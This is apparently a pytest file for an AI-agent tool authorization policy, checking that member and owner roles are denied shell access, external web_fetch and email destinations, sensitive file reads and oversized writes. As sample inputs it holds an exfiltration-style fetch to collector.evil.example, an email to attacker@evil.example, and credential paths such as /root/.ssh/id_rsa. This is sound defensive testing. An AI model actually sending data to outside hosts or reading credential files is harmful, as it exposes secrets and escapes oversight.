from __future__ import annotations

import yaml

from aiauthz.policy import DEFAULT_POLICY_YAML, evaluate

POLICY = yaml.safe_load(DEFAULT_POLICY_YAML)


def test_role_gate_still_blocks_owner_only_tool_for_member():
    d = evaluate(policy=POLICY, tool_name="shell", role="member", args={"cmd": "ls"})
    assert not d.allow
    assert "role_not_in_allowlist" in d.reason


def test_web_fetch_external_url_denied_for_member():
    """The exfil gap: a member may call web_fetch, but the default url_allowlist
    is empty, so an external destination is denied at the argument layer."""
    d = evaluate(policy=POLICY, tool_name="web_fetch", role="member",
                 args={"url": "http://collector.evil.example/upload", "body": "secrets"})
    assert not d.allow
    assert "url_not_in_allowlist" in d.reason


def test_web_fetch_allowed_when_url_on_allowlist():
    policy = yaml.safe_load(DEFAULT_POLICY_YAML)
    policy["constraints"]["web_fetch"]["url_allowlist"] = ["https://api.internal.example.com/*"]
    d = evaluate(policy=policy, tool_name="web_fetch", role="member",
                 args={"url": "https://api.internal.example.com/v1/data"})
    assert d.allow


def test_file_read_sensitive_path_denied():
    for path in ["/etc/passwd", "/root/.ssh/id_rsa", "/app/config/.env", "/x/secrets.txt"]:
        d = evaluate(policy=POLICY, tool_name="file_read", role="owner", args={"path": path})
        assert not d.allow, f"{path} should be denied"
        assert "path_denied" in d.reason


def test_file_read_ordinary_path_allowed_for_owner():
    d = evaluate(policy=POLICY, tool_name="file_read", role="owner",
                 args={"path": "/var/app/workspace/report.txt"})
    assert d.allow


def test_file_write_size_limit_enforced():
    big = "x" * (1048576 + 1)
    d = evaluate(policy=POLICY, tool_name="file_write", role="owner",
                 args={"path": "/var/app/workspace/out.txt", "content": big})
    assert not d.allow
    assert "payload_exceeds_max_bytes" in d.reason


def test_send_email_external_recipient_denied():
    d = evaluate(policy=POLICY, tool_name="send_email", role="owner",
                 args={"to": "attacker@evil.example", "body": "data"})
    assert not d.allow
    assert "recipient_not_in_allowlist" in d.reason
